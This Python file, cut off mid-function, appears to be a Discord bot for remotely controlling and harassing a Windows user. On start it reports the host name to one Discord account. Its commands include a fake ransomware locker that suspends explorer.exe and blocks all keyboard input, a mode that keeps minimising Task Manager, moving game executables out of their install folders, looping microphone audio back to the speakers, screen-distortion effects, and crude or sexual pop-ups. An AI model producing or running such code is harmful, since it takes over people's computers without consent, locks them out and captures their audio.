import discord
from discord.ext import commands, tasks
import os
import pygame
import sys
import psutil
import multiprocessing
import tkinter as tk
from PIL import Image, ImageTk
import asyncio
import random
import pyautogui
import pyttsx3
from PIL import ImageGrab
import io
import threading
import webbrowser
import ctypes
from plyer import notification
from tkinter import messagebox
import sounddevice as sd
from scipy.io.wavfile import write as write_wav
import time
import pyperclip
from tkinter import simpledialog
import win32gui
import win32api
import win32con
import wmi
import screen_brightness_control as sbc
import shutil
from tkinter import ttk
from dotenv import load_dotenv
from pynput import mouse
from pynput import keyboard

pygame.mixer.init()

load_dotenv()

TOKEN = os.getenv('BOT_TOKEN')

DESKTOP_PATH = os.path.join(os.path.expanduser("~"), "Desktop")

purgatory_active = False

melt_active = False

window_dissolve_active = False

gdi_vortex_active = False

artifacts_active = False

window_runner_active = False

echo_active = False

dota_already_detected = False

fake_lag_active = False
lag_intensity = 0.1

start_time = time.time()

pixel_process = None

mouse_inverted = False
inverted_listener = None
mouse_ctl = mouse.Controller()
mouse_swapped = False
mouse_slowed = False
slow_multiplier = 0.1

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
tts_lock = threading.Lock()
TARGET_PROCESS = "stalcraft.exe"
IMAGE_PATH = "images/IMG_6242.JPG"

ALLOWED_USER_ID = 416798376823095296
ALLOWED_ROLE_ID = 924996503179767820

window_process = None
window_opened_by = None

SOUND_PATH = "sounds/BRAZIL FONK.mp3"
AVAILABLE_SOUNDS = {
    "Фонк": "sounds/BRAZIL FONK.mp3",
    "Слоник": "sounds/Slonik.mp3",
    "Дикий запад": "sounds/Cowboy.mp3",
    "Батарея": "sounds/batarey.mp3",
    "Kaif": "sounds/Mmm.mp3",
    "Sniper": "sounds/pornyshka.mp3",
    "Serega": "sounds/Serega.mp3",
    "Hleb": "sounds/Hleb.mp3",
    "Glazki": "sounds/otkroi-glazki.mp3",
    "Evrei": "sounds/evrei.mp3",
    "Portal": "sounds/portal.mp3",
    "Rakom": "sounds/rakom.mp3",
    "Marmok": "sounds/marmok.mp3",
    "Hyi": "sounds/diadia-sasha.mp3",
    "Signal": "sounds/signal.mp3",
    "Vistrel": "sounds/vistrel.mp3",
    "Babyshka": "sounds/Babyshka.mp3",
    "Porno": "sounds/porno.mp3",
    "Samolet": "sounds/samolety_027.mp3",
    "Droch": "sounds/Droch.mp3",
    "Pepa": "sounds/Pepa.mp3",
    "Afrika": "sounds/Afrika.mp3",
    "Deti": "sounds/Deti.mp3",
    "Mama": "sounds/Ma.mp3",
    "Intro": "sounds/Intro.mp3",
    "Femboy": "sounds/Femboy.mp3",
    "Pivo": "sounds/pivo.mp3",
    "MetalPipe": "sounds/metalpipe.mp3"
}
AVAILABLE_IMAGES = {
    "Первая картинка": "images/IMG_6242.JPG",
    "Смешной кот": "images/edbe23aa-cd77-4ccc-a811-12692154149.png",
    "Батарея": "images/5269660225357157265.jpg",
    "Bobr": "images/edbe23aa-cd77-4ccc-a811-1269215414.jpg",
    "Kostya": "images/ba6b068a-6d42-45d4-871b-a6d4b2a8ebbf1.jpg",
    "Vanya": "images/ba6b068a-6d42-45d4-871b-a6d4b2a8ebbf2.jpg",
    "VodolaZ": "images/ba6b068a-6d42-45d4-871b-a6d4b2a8ebbf.png",
    "Sex": "images/5269660225357157264.jpg",
    "Byrat": "images/5269660225357157270.jpg",
    "KrytoiVodolaZ": "images/5397966205752118305.jpg",
    "VanyaSong": "images/edbe23aa-cd77-4ccc-a811-12692154148b.jpg",
    "Orygez": "images/d8dd0c1dffde2af1a1844473a6788b1e.jpg",
    "Anya": "images/ba6b068a-6d42-45d4-871b-a6d4b2a8ebbf2.png",
    "Pchel": "images/ba6b068a-6d42-45d4-871b-a6d4b2a8ebbf23.jpg",
    "Pipe": "images/ba6b068a-6d42-45d4-871b-a6d4b2a8ebbf4.jpg"
}


AVAILABLE_APPS = {
    "Блокнот": "notepad.exe",
    "Калькулятор": "calc.exe",
    "Soundpad": r"D:\Рабочий стол\Soundpad\Soundpad.exe",
    "Dota": r"E:\SteamLibrary\steamapps\common\dota 2 beta\game\bin\win64\dota2.exe",
    "Stalcraft": r"C:\Steam\steamapps\common\STALCRAFT\bin_global\win64\java\bin\stalcraft.exe"
}

GAMES_EXES = {
    "Dota": r"E:\SteamLibrary\steamapps\common\dota 2 beta\game\bin\win64\dota2.exe",
    "Stalcraft": r"C:\Steam\steamapps\common\STALCRAFT\bin_global\win64\java\bin\stalcraft.exe"
}

intents = discord.Intents.all()
bot = commands.Bot(command_prefix='!', intents=intents, case_insensitive=True)


@bot.event
async def on_ready():
    print('□♥□♥□♥□♥□♥□♥□♥')

    if not check_game.is_running():
        check_game.start()
    
    if not check_dota.is_running():
        check_dota.start()

    try:
        user = await bot.fetch_user(ALLOWED_USER_ID)
        if user:
            # Собираем инфо о системе
            ver = sys.version.split()[0]
            host = os.getlogin()
            status_msg = (
                f"🚀 **Система управления ПК запущена!**\n"
                f"👤 **Хост:** `{host}`\n"
                f"🐍 **Python:** `{ver}`\n"
                f"📂 **Директория:** `{BASE_DIR}`\n"
            )
            await user.send(status_msg)
    except Exception as e:
        print(f"Не удалось отправить отчет админу: {e}")

def show_fullscreen_process(img_path):
    root = tk.Tk()
    root.attributes("-fullscreen", True)
    root.bind("<Escape>", lambda e: root.destroy())

    try:
        img = Image.open(img_path)
        screen_width = root.winfo_screenwidth()
        screen_height = root.winfo_screenheight()
        img = img.resize((screen_width, screen_height), Image.LANCZOS)
        
        photo = ImageTk.PhotoImage(img)
        label = tk.Label(root, image=photo, bg="black")
        label.image = photo # Защита от garbage collector
        label.pack(expand=True)
        root.mainloop()
    except Exception as e:
        print(f"Ошибка в окне: {e}")

async def watch_window(proc):
    # Ждем завершения процесса (окна), не блокируя работу бота
    await asyncio.to_thread(proc.join)
    
    # Сюда код дойдет В ТУ ЖЕ ДОЛЮ СЕКУНДЫ, как окно закроется!
    if pygame.mixer.music.get_busy():
        pygame.mixer.music.stop()
        print("Окно закрыто. Звук остановлен мгновенно.")
        
    global window_process, window_opened_by
    # Очищаем переменные
    if window_process == proc:
        window_process = None
        window_opened_by = None

@tasks.loop(seconds=5)
async def check_dota():
    global dota_already_detected
    
    is_dota_running = False
    
    # Ищем только Доту
    for proc in psutil.process_iter(['name']):
        try:
            if "dota2.exe" in proc.info['name'].lower():
                is_dota_running = True
                break
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue

    if is_dota_running:
        if not dota_already_detected:
            sound_to_play = AVAILABLE_SOUNDS.get("Pivo", list(AVAILABLE_SOUNDS.values())[0])
            
            try:
                if not pygame.mixer.music.get_busy():
                    pygame.mixer.music.load(sound_to_play)
                    asyncio.sleep(3)
                    pygame.mixer.music.play()
            except Exception as e:
                print(f"Ошибка звука Доты: {e}")
                
            dota_already_detected = True
    else:
        if dota_already_detected:
            print("🎮 [Dota-Patrol] Цель покинула игру.")
        dota_already_detected = False

@tasks.loop(seconds=3600)
async def check_game():
    global window_process, window_opened_by, IMAGE_PATH, SOUND_PATH
    is_running = False
    
    for proc in psutil.process_iter(['name']):
        try:
            if proc.info['name'] and TARGET_PROCESS.lower() in proc.info['name'].lower():
                is_running = True
                break
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue

    if is_running:
        if window_process is None or not window_process.is_alive():
            print(f"Обнаружен {TARGET_PROCESS}. Запускаю окно...")
            
            IMAGE_PATH = random.choice(list(AVAILABLE_IMAGES.values()))
            
            if IMAGE_PATH == "images/5269660225357157265.jpg": 
                SOUND_PATH = "sounds/batarey.mp3" 
            elif IMAGE_PATH == "images/ba6b068a-6d42-45d4-871b-a6d4b2a8ebbf2.jpg":
                SOUND_PATH = "sounds/Slonik.mp3"
            elif IMAGE_PATH == "images/edbe23aa-cd77-4ccc-a811-1269215414.jpg":
                SOUND_PATH = "sounds/Serega.mp3"
            elif IMAGE_PATH == "images/5269660225357157270.jpg":
                SOUND_PATH = "sounds/otkroi-glazki.mp3" 
            elif IMAGE_PATH == "images/5269660225357157264.jpg":
                SOUND_PATH = "sounds/rakom.mp3" 
            else:
                SOUND_PATH = random.choice(list(AVAILABLE_SOUNDS.values()))

            play()
            window_opened_by = 'auto'
            window_process = multiprocessing.Process(target=show_fullscreen_process, args=(IMAGE_PATH,), daemon=True)
            window_process.start()
            
            asyncio.create_task(watch_window(window_process))
    else:
        if window_process and window_process.is_alive() and window_opened_by == 'auto':
            window_process.terminate()
            print(f"{TARGET_PROCESS} закрыт. Закрываю окно.")



def purgatory_logic():
    import win32gui, win32api, win32con, random, time, ctypes
    import pywintypes # Импортируем для обработки специфичных ошибок

    hdc = win32gui.GetDC(0)
    sw = win32api.GetSystemMetrics(0)
    sh = win32api.GetSystemMetrics(1)
    
    while purgatory_active:
        try:
            # 1. ВИЗУАЛЬНЫЙ УДАР (SRCINVERT)
            x = random.randint(0, sw - 200)
            y = random.randint(0, sh - 200)
            win32gui.BitBlt(hdc, x + random.randint(-10, 10), y + random.randint(-10, 10), 
                            200, 200, hdc, x, y, win32con.SRCINVERT)

            # 2. АКУСТИЧЕСКИЙ ТЕРРОР
            if random.random() > 0.95:
                ctypes.windll.kernel32.Beep(random.randint(500, 5000), 50)

            # 3. ФИЗИЧЕСКИЙ ХАОС (С ЗАЩИТОЙ)
            try:
                mx, my = win32api.GetCursorPos()
                # Используем ctypes напрямую, он иногда стабильнее win32api
                ctypes.windll.user32.SetCursorPos(mx + random.randint(-3, 3), my + random.randint(-3, 3))
            except (pywintypes.error, Exception):
                # Если Windows запретила трогать мышь - просто игнорируем
                pass

            # 4. БЛОКИРОВКА ДИСПЕТЧЕРА ЗАДАЧ
            # Ищем по классу окна, это надежнее чем по имени
            taskmgr_hwnd = win32gui.FindWindow("TaskManagerWindow", None)
            if taskmgr_hwnd:
                win32gui.ShowWindow(taskmgr_hwnd, win32con.SW_MINIMIZE)

        except Exception as e:
            # Общий ловушка, чтобы поток не падал ни при каких обстоятельствах
            print(f"Поток Чистилища встретил сопротивление: {e}")
            time.sleep(0.1)
        
        time.sleep(0.01)
    
    win32gui.ReleaseDC(0, hdc)

@bot.slash_command(name='digital_purgatory', description='Нахуй не используйте это полная пизда', guild_ids=[711194167757242368])
async def purgatory_slash(ctx: discord.ApplicationContext, action: discord.Option(str, choices=["ВКЛЮЧИТЬ АД", "СТОП"])):
    global purgatory_active
    if action == "ВКЛЮЧИТЬ АД":
        purgatory_active = True
        threading.Thread(target=purgatory_logic, daemon=True).start()
        await ctx.respond("🔥 **Добро пожаловать в Чистилище.** Теперь компьютер принадлежит не тебе.")
    else:
        purgatory_active = False
        win32gui.InvalidateRect(0, None, True)
        await ctx.respond("❄️ Хаос остановлен. Система охлаждена.")

def melt_logic():
    hdc = win32gui.GetDC(0)
    sw = win32api.GetSystemMetrics(0)
    sh = win32api.GetSystemMetrics(1)
    
    while melt_active:
        # Выбираем случайную координату X
        x = random.randint(0, sw)
        # Ширина "капли"
        width = random.randint(5, 30)
        # На сколько пикселей стекает (глубина)
        height = random.randint(1, 15)
        
        # Копируем полоску чуть ниже её текущего положения
        win32gui.BitBlt(hdc, x, random.randint(0, sh), width, sh, hdc, x, 0, win32con.SRCCOPY)
        
        # Минимальная пауза для плавности
        time.sleep(0.001)

@bot.slash_command(name='screen_melt', description='Заставить экран "стекать" вниз (ХАРДКОР)', guild_ids=[711194167757242368])
async def melt_slash(ctx: discord.ApplicationContext, action: discord.Option(str, choices=["Начать", "Стоп"])):
    global melt_active
    if action == "Начать":
        melt_active = True
        threading.Thread(target=melt_logic, daemon=True).start()
        await ctx.respond("🫠 **Лед тронулся.** Экран начал плавиться.")
    else:
        melt_active = False
        win32gui.InvalidateRect(0, None, True)
        await ctx.respond("🧊 Система охлаждена. Картинка застыла.")

def vortex_logic():
    import win32gui, win32api, win32con, math, time
    
    hdc = win32gui.GetDC(0)
    sw = win32api.GetSystemMetrics(0)
    sh = win32api.GetSystemMetrics(1)
    
    angle = 0
    while gdi_vortex_active:
        # Увеличиваем угол вращения
        angle += 0.05
        
        # Вычисляем точки параллелограмма для вращения и сжатия
        # Это создает эффект закручивания в центр
        center_x, center_y = sw // 2, sh // 2
        radius = 0.98 # Коэффициент сжатия (98% от оригинала)
        
        # Три опорные точки для PlgBlt (верхний левый, верхний правый, нижний левый углы)
        res = [
            (int(center_x + (0 - center_x) * math.cos(angle) * radius - (0 - center_y) * math.sin(angle) * radius),
             int(center_y + (0 - center_x) * math.sin(angle) * radius + (0 - center_y) * math.cos(angle) * radius)),
            
            (int(center_x + (sw - center_x) * math.cos(angle) * radius - (0 - center_y) * math.sin(angle) * radius),
             int(center_y + (sw - center_x) * math.sin(angle) * radius + (0 - center_y) * math.cos(angle) * radius)),
            
            (int(center_x + (0 - center_x) * math.cos(angle) * radius - (sh - center_y) * math.sin(angle) * radius),
             int(center_y + (0 - center_x) * math.sin(angle) * radius + (sh - center_y) * math.cos(angle) * radius))
        ]
        
        # Рисуем искаженный экран поверх текущего
        try:
            win32gui.PlgBlt(hdc, res, hdc, 0, 0, sw, sh, 0, 0, 0)
        except:
            pass
            
        time.sleep(0.01)

@bot.slash_command(name='gdi_vortex', description='Закрутить экран в бесконечный фрактальный вихрь', guild_ids=[711194167757242368])
async def vortex_slash(ctx: discord.ApplicationContext, action: discord.Option(str, choices=["Включить", "Выключить"])):
    global gdi_vortex_active
    if action == "Включить":
        gdi_vortex_active = True
        threading.Thread(target=vortex_logic, daemon=True).start()
        await ctx.respond("🌪️ **Вихрь активирован.** Реальность начала вращаться.")
    else:
        gdi_vortex_active = False
        win32gui.InvalidateRect(0, None, True)
        await ctx.respond("🧊 Пространство стабилизировано.")

def feedback_logic():
    import win32gui, win32api, win32con, time
    
    hdc = win32gui.GetDC(0)
    sw = win32api.GetSystemMetrics(0)
    sh = win32api.GetSystemMetrics(1)
    
    while gdi_feedback_active:
        # Копируем экран сам в себя, но чуть меньше и со смещением в центр
        # StretchBlt - это мощь. Она сжимает изображение на лету.
        win32gui.StretchBlt(
            hdc, 
            int(sw * 0.025), int(sh * 0.025), # Координаты вставки (смещение на 2.5%)
            int(sw * 0.95), int(sh * 0.95),   # Размер вставки (95% от оригинала)
            hdc, 
            0, 0, sw, sh,                     # Источник (весь экран)
            win32con.SRCCOPY
        )
        
        # Минимальная пауза, чтобы не повесить видеокарту в ноль
        time.sleep(0.01)

@bot.slash_command(name='gdi_feedback', description='Запустить рекурсивный тоннель (ХАРДКОР)', guild_ids=[711194167757242368])
async def feedback_slash(ctx: discord.ApplicationContext, action: discord.Option(str, choices=["Включить", "Выключить"])):
    global gdi_feedback_active
    if action == "Включить":
        gdi_feedback_active = True
        threading.Thread(target=feedback_logic, daemon=True).start()
        await ctx.respond("🌀 **Внимание:** Активирована визуальная рекурсия. Реальность нестабильна.")
    else:
        gdi_feedback_active = False
        win32gui.InvalidateRect(0, None, True)
        await ctx.respond("🧊 Фрактальный тоннель схлопнулся.")

def artifacts_logic():
    import win32gui, win32api, win32con, random, time, pywintypes
    
    sw = win32api.GetSystemMetrics(0)
    sh = win32api.GetSystemMetrics(1)
    
    while artifacts_active:
        # Получаем HDC прямо внутри цикла, чтобы он всегда был свежим
        hdc = win32gui.GetDC(0)
        if not hdc:
            time.sleep(0.1)
            continue
            
        try:
            mode = random.random()
            color = win32api.RGB(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
            x = random.randint(0, sw - 10)
            y = random.randint(0, sh - 10)

            if mode < 0.7:
                size = random.choice([2, 4, 8])
                for i in range(size):
                    for j in range(size):
                        # Рисуем только если пиксель в пределах экрана
                        win32gui.SetPixel(hdc, x + i, y + j, color)
            
            elif mode < 0.9:
                length = random.randint(50, 300)
                thick = random.randint(1, 3)
                for t in range(thick):
                    for l in range(length):
                        if x + l < sw:
                            win32gui.SetPixel(hdc, x + l, y + t, color)
            else:
                w, h = random.randint(10, 50), random.randint(10, 50)
                win32gui.BitBlt(hdc, x, y, w, h, hdc, x + random.randint(-5, 5), y + random.randint(-5, 5), win32con.SRCCOPY)

        except pywintypes.error:
            # Если возникла ошибка отрисовки, просто пропускаем итерацию
            pass
        finally:
            # КРИТИЧЕСКИ ВАЖНО: Освобождаем контекст, чтобы не было утечки GDI-объектов
            win32gui.ReleaseDC(0, hdc)

        time.sleep(random.uniform(0.01, 0.05))

@bot.slash_command(name='monitor_artifacts', description='Симулировать отвал видеокарты (GDI артефакты)', guild_ids=[711194167757242368])
async def artifacts_slash(ctx: discord.ApplicationContext, action: discord.Option(str, choices=["Включить", "Выключить"])):
    global artifacts_active
    if action == "Включить":
        if artifacts_active:
            return await ctx.respond("📺 Артефакты уже активны!", ephemeral=True)
        artifacts_active = True
        threading.Thread(target=artifacts_logic, daemon=True).start()
        await ctx.respond("☢️ **Критический сбой видеопамяти имитирован.** Экран пошел полосами.")
    else:
        artifacts_active = False
        # Очищаем экран от мусора (заставляем Windows перерисовать всё)
        import win32gui
        win32gui.InvalidateRect(0, None, True)
        await ctx.respond("💎 Видеочип «восстановлен». Экран очищен.")

def move_exe_direct(game_name):
    source_path = GAMES_EXES.get(game_name)
    
    if not source_path:
        return False, "Игра не настроена в списке."

    if not os.path.exists(source_path):
        return False, f"Файл не найден по пути: {source_path}"

    # Имя файла для рабочего стола (например, dota2.exe)
    exe_filename = os.path.basename(source_path)
    destination_path = os.path.join(DESKTOP_PATH, exe_filename)

    try:
        # Перемещаем файл
        shutil.move(source_path, destination_path)
        # Сохраняем путь в лог или переменную, чтобы потом вернуть (по желанию)
        return True, destination_path
    except Exception as e:
        return False, f"Ошибка доступа (запусти от админа): {e}"

@bot.slash_command(name='move_exe', description='Мгновенно выбросить EXE игры на рабочий стол', guild_ids=[711194167757242368])
async def move_exe_slash(ctx: discord.ApplicationContext, game: discord.Option(str, choices=list(GAMES_EXES.keys()))):
    success, result = await asyncio.to_thread(move_exe_direct, game)
    
    if success:
        await ctx.respond(f"🚀 **Бабах!** `{os.path.basename(result)}` теперь на рабочем столе.\nПуть в Steam теперь пуст!")
    else:
        await ctx.respond(f"❌ **Провал:** {result}", ephemeral=True)

def start_locker(seconds=60):
    # --- ШАГ 1: ГАСИМ ПРОВОДНИК (Win и Панель задач) ---
    def toggle_explorer(stop=True):
        for proc in psutil.process_iter(['name']):
            if proc.info['name'] == 'explorer.exe':
                p = psutil.Process(proc.pid)
                if stop: p.suspend() # Замораживаем
                else: p.resume()    # Размораживаем

    try: toggle_explorer(True)
    except: pass # Если нет прав, локер сработает хуже, но сработает

    root = tk.Tk()
    root.attributes("-fullscreen", True)
    root.attributes("-topmost", True)
    root.configure(background='black')
    root.config(cursor="none")
    root.protocol("WM_DELETE_WINDOW", lambda: None)

    # --- ШАГ 2: АГРЕССИВНЫЙ ФОКУС ---
    def keep_focus():
        root.lift()
        root.focus_force()
        root.attributes("-topmost", True)
        if not root.winfo_exists(): return
        root.after(100, keep_focus)

    # --- ШАГ 3: БЛОКИРОВКА (теперь работает лучше) ---
    def block_keys():
        def on_press(key):
            # В этом режиме даже если Win прорвется, Explorer не ответит
            return False 

        with keyboard.Listener(on_press=on_press, suppress=True) as listener:
            listener.join()

    threading.Thread(target=block_keys, daemon=True).start()
    
    label = tk.Label(root, text="Если я вас обидел то звоните:8 (495) 963-11-02", font=("Courier", 40, "bold"), fg="red", bg="black")
    label.pack(pady=100)
    
    timer_label = tk.Label(root, text="", font=("Courier", 80, "bold"), fg="red", bg="black")
    timer_label.pack(pady=20)

    def update_timer(count):
        if count >= 0:
            timer_label.config(text=f"До того как тебе порвут очко осталось: {count}%")
            root.after(1000, update_timer, count - 1)
        else:
            try: toggle_explorer(False) # Возвращаем Windows к жизни
            except: pass
            root.destroy()

    update_timer(seconds)
    keep_focus()
    root.mainloop()

@bot.slash_command(name='fake_ransomware', description='Запустить имитацию вируса-вымогателя', guild_ids=[711194167757242368])
async def ransomware_slash(ctx: discord.ApplicationContext, time_sec: discord.Option(int, "Время таймера (сек)", default=60)):
    await ctx.respond("☣️ **Вирус-вымогатель запущен.** Жертва в ловушке.")
    
    # Запускаем в отдельном процессе через multiprocessing, 
    # так как tkinter плохо живет в потоках
    p = multiprocessing.Process(target=start_locker, args=(time_sec,), daemon=True)
    p.start()



def fake_lag_logic():
    import ctypes
    import time
    
    # Подгружаем функцию перемещения для скорости
    set_pos = ctypes.windll.user32.SetCursorPos
    get_pos = ctypes.windll.user32.GetCursorPos
    
    class POINT(ctypes.Structure):
        _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]

    while fake_lag_active:
        # 1. Фиксируем точку "заморозки"
        pt = POINT()
        get_pos(ctypes.byref(pt))
        freeze_x, freeze_y = pt.x, pt.y
        
        start_time = time.perf_counter()
        
        while time.perf_counter() - start_time < lag_intensity:
            if not fake_lag_active: break
            set_pos(freeze_x, freeze_y)
            # Микро-пауза, чтобы не забить процессор на 100%
            time.sleep(0.001) 
        
        time.sleep(0.01)

@bot.slash_command(name='fake_lag', description='Создать эффект диких лагов мышки', guild_ids=[711194167757242368])
async def fake_lag_slash(ctx: discord.ApplicationContext, action: discord.Option(str, choices=["Включить", "Выключить"])):
    global fake_lag_active
    
    if action == "Включить":
        if fake_lag_active:
            return await ctx.respond("⏳ Лаги уже активированы!", ephemeral=True)
        fake_lag_active = True
        threading.Thread(target=fake_lag_logic, daemon=True).start()
        await ctx.respond("📉 **Система «лагает»!** Теперь мышка движется рывками, как на древнем железе.")
    else:
        fake_lag_active = False
        await ctx.respond("🚀 **Лаги устранены.** Система снова работает плавно.")


@bot.slash_command(name='window_shrink', description='Сжать активное окно до размера 50x50', guild_ids=[711194167757242368])
async def window_shrink_slash(ctx: discord.ApplicationContext):
    import win32gui, win32con
    
    hwnd = win32gui.GetForegroundWindow()
    if not hwnd:
        return await ctx.respond("❌ Не найдено активное окно.", ephemeral=True)
    
    # 1. Сначала восстанавливаем окно, если оно развернуто
    tup = win32gui.GetWindowPlacement(hwnd)
    if tup[1] == win32con.SW_SHOWMAXIMIZED:
        win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
        time.sleep(0.1)
    
    # 2. Получаем координаты, чтобы окно не прыгало при уменьшении
    rect = win32gui.GetWindowRect(hwnd)
    x, y = rect[0], rect[1]
    
    # 3. Сжимаем до 50x50
    # True в конце заставляет окно перерисоваться
    win32gui.MoveWindow(hwnd, x, y, 50, 50, True)
    
    await ctx.respond("🔎 **Окно превращено в нано-объект!**")

def runner_logic():
    import win32gui, win32api, win32con, random
    
    # Размеры экрана
    sw = win32api.GetSystemMetrics(win32con.SM_CXSCREEN)
    sh = win32api.GetSystemMetrics(win32con.SM_CYSCREEN)

    while window_runner_active:
        hwnd = win32gui.GetForegroundWindow()
        if hwnd:
            if win32gui.GetClassName(hwnd) not in ["Progman", "Shell_TrayWnd"]:
                # 1. Снимаем полноэкранный режим, если он есть
                tup = win32gui.GetWindowPlacement(hwnd)
                if tup[1] == win32con.SW_SHOWMAXIMIZED:
                    win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
                    time.sleep(0.1)

                # 2. Получаем текущие размеры
                rect = win32gui.GetWindowRect(hwnd)
                w = rect[2] - rect[0]
                h = rect[3] - rect[1]
                
                # 3. КРИТИЧЕСКИЙ ФИКС: Если окно слишком большое, уменьшаем его!
                if w > 100 or h > 100:
                    w = 100
                    h = 100
                    # Сразу применяем новый размер, чтобы расчеты ниже были верными
                    win32gui.MoveWindow(hwnd, rect[0], rect[1], w, h, True)

                # 4. Проверяем положение мыши
                mx, my = win32api.GetCursorPos()
                wx, wy = (rect[0] + w // 2), (rect[1] + h // 2)
                
                if abs(mx - wx) < 150 and abs(my - wy) < 150:
                    # Прыгаем в любое место, где окно влезет целиком
                    new_x = random.randint(0, max(0, sw - w))
                    new_y = random.randint(0, max(0, sh - h))
                    win32gui.MoveWindow(hwnd, new_x, new_y, w, h, True)
                    
        time.sleep(0.1)

@bot.slash_command(name='window_runner', description='Окна начинают убегать от мышки', guild_ids=[711194167757242368])
async def window_runner_slash(ctx: discord.ApplicationContext, action: discord.Option(str, choices=["Включить", "Выключить"])):
    global window_runner_active
    if action == "Включить":
        window_runner_active = True
        threading.Thread(target=runner_logic, daemon=True).start()
        await ctx.respond("🏃 **Окна вышли на пробежку!** Попробуй поймай.")
    else:
        window_runner_active = False
        await ctx.respond("🛑 Окна устали и остановились.")

def echo_logic():
    import sounddevice as sd
    fs = 44100
    duration = 1.5
    while echo_active:
        rec = sd.rec(int(duration * fs), samplerate=fs, channels=1, dtype='int16')
        sd.wait()
        if echo_active:
            sd.play(rec, fs)
            sd.wait()

@bot.slash_command(name='echo_voice', description='Зацикленное эхо из микрофона в колонки', guild_ids=[711194167757242368])
async def echo_voice_slash(ctx: discord.ApplicationContext, action: discord.Option(str, choices=["Включить", "Выключить"])):
    global echo_active
    if action == "Включить":
        echo_active = True
        threading.Thread(target=echo_logic, daemon=True).start()
        await ctx.respond("🎙️ **Эхо-паранойя запущена.** Теперь жертва будет спотыкаться о свои же слова.")
    else:
        echo_active = False
        await ctx.respond("🔇 Тишина восстановлена.")

def slow_mouse_logic():
    import ctypes
    import pyautogui
    
    last_x, last_y = pyautogui.position()
    
    while mouse_slowed:
        curr_x, curr_y = pyautogui.position()
        
        if (curr_x, curr_y) != (last_x, last_y):
            dx = curr_x - last_x
            dy = curr_y - last_y
            
            target_x = last_x + (dx * slow_multiplier)
            target_y = last_y + (dy * slow_multiplier)
            
            ctypes.windll.user32.SetCursorPos(int(target_x), int(target_y))
            
            last_x, last_y = target_x, target_y
            
        time.sleep(0.001)

@bot.slash_command(name='mouse_slow', description='Замедлить мышь в 10 раз', guild_ids=[711194167757242368])
async def mouse_slow_slash(ctx: discord.ApplicationContext, action: discord.Option(str, choices=["Включить", "Выключить"])):
    global mouse_slowed
    
    if action == "Включить":
        if mouse_slowed:
            return await ctx.respond("⏳ Мышь уже замедлена!", ephemeral=True)
        mouse_slowed = True
        threading.Thread(target=slow_mouse_logic, daemon=True).start()
        await ctx.respond("🐌 **Режим улитки активирован.** Мышь замедлена в 10 раз.")
    else:
        mouse_slowed = False
        await ctx.respond("⚡ **Скорость мыши возвращена в норму.**")

def on_move_inverted(x, y):
    if mouse_inverted:
        pass 

def inversion_logic():
    screen_w, screen_h = pyautogui.size()
    last_x, last_y = pyautogui.position()
    
    while mouse_inverted:
        curr_x, curr_y = pyautogui.position()
        
        if (curr_x, curr_y) != (last_x, last_y):
            dx = curr_x - last_x
            dy = curr_y - last_y
            
            target_x = last_x - dx
            target_y = last_y - dy
                       
            target_x = max(5, min(screen_w - 5, target_x))
            target_y = max(5, min(screen_h - 5, target_y))
            
            ctypes.windll.user32.SetCursorPos(int(target_x), int(target_y))
            
            last_x, last_y = target_x, target_y
            
        time.sleep(0.001)

@bot.slash_command(name='invert_mouse', description='Инвертировать движение мыши (оси X и Y)', guild_ids=[711194167757242368])
async def invert_mouse_slash(ctx: discord.ApplicationContext):
    global mouse_inverted
    
    mouse_inverted = not mouse_inverted
    
    if mouse_inverted:
        threading.Thread(target=inversion_logic, daemon=True).start()
        await ctx.respond("🙃 **МЫШЬ ИНВЕРТИРОВАНА!**")
    else:
        await ctx.respond("✅ **Движение мыши возвращено в норму.**")


def run_fake_delete():
    try:
        root = tk.Tk()
        root.title("Удаление файлов")
        root.geometry("400x150+500+400")
        root.attributes("-topmost", True)
        root.resizable(False, False)

        label = tk.Label(root, text="Удаление папки гей фурри порно (642 ГБ)...", pady=20)
        label.pack()

        progress = ttk.Progressbar(root, orient="horizontal", length=300, mode="determinate")
        progress.pack()

        for i in range(101):
            # КРИТИЧЕСКАЯ ПРОВЕРКА: Если окно закрыли, выходим из цикла
            if not root.winfo_exists():
                break
            
            progress['value'] = i
            root.update()
            time.sleep(0.5)
        
        # Если окно еще живо после цикла — закрываем
        if root.winfo_exists():
            root.destroy()
    except Exception as e:
        print(f"Окно удаления было закрыто: {e}")

@bot.slash_command(name='fake_delete', description='Запустить фейковое удаление папки с играми', guild_ids=[711194167757242368])
async def fake_delete_slash(ctx: discord.ApplicationContext):
    await ctx.respond("🧨 Фейковое удаление запущено. Наслаждайтесь паникой.")
    p = multiprocessing.Process(target=run_fake_delete, daemon=True)
    p.start()

def run_dead_pixel_process():
    root = tk.Tk()
    root.overrideredirect(True)
    root.attributes("-topmost", True)
    root.config(bg="black")
    
    # Случайное место
    x = random.randint(100, 1200)
    y = random.randint(100, 800)
    root.geometry(f"5x5+{x}+{y}")
    
    root.mainloop()

@bot.slash_command(name='dead_pixel', description='Создать "битый пиксель" на экране', guild_ids=[711194167757242368])
async def dead_pixel_slash(ctx: discord.ApplicationContext, action: discord.Option(str, choices=["Создать", "Убрать"])):
    
    global pixel_process
    
    if action == "Создать":
        if pixel_process and pixel_process.is_alive():
            return await ctx.respond("⚠️ Пиксель уже существует!", ephemeral=True)
            
        await ctx.respond("💀 Битый пиксель появился. Жертва уже ищет салфетку.")
        # Запускаем как независимый процесс
        pixel_process = multiprocessing.Process(target=run_dead_pixel_process, daemon=True)
        pixel_process.start()
        
    else:
        if pixel_process and pixel_process.is_alive():
            # "Топорный" метод — просто убиваем процесс окна
            pixel_process.terminate()
            pixel_process = None
            await ctx.respond("🧼 Пиксель успешно «отмыт»!")
        else:
            await ctx.respond("❓ Активных битых пикселей не найдено.", ephemeral=True)

def run_ghost_cursor():
    root = tk.Tk()
    root.overrideredirect(True) # Убираем рамки
    root.attributes("-topmost", True) # Поверх всех окон
    root.attributes("-transparentcolor", "white") # Делаем белый фон прозрачным
    root.config(bg="white")

    # Загружаем картинку курсора
    img = Image.open(os.path.join(BASE_DIR, "images/ba6b068a-6d42-45d4-871b-a6d4b2a8ebbf52.png")).convert("RGBA")
    img = img.resize((20, 20))
    tk_img = ImageTk.PhotoImage(img)
    
    label = tk.Label(root, image=tk_img, bg="white")
